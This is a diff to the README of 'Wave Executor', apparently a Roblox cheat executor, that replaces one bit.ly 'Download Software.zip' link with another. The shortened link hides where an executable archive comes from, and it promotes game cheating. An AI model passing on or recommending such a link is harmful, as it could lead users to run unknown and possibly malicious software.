@@ -59,4 +59,4 @@ Wave Executor is licensed under the MIT License. See the [LICENSE](LICENSE) file
 
 [Wave Executor](https://waveexecutor.com) - Elevate your Roblox gameplay with Wave Executor! 🌊🚀
 
-[![Download Wave Executor](https://img.shields.io/badge/Download-Software.zip-<COLOR>.svg)](https://bit.ly/3Vk6jRq)
+[![Download Wave Executor](https://img.shields.io/badge/Download-Software.zip-<COLOR>.svg)](https://bit.ly/3CYSSAj)
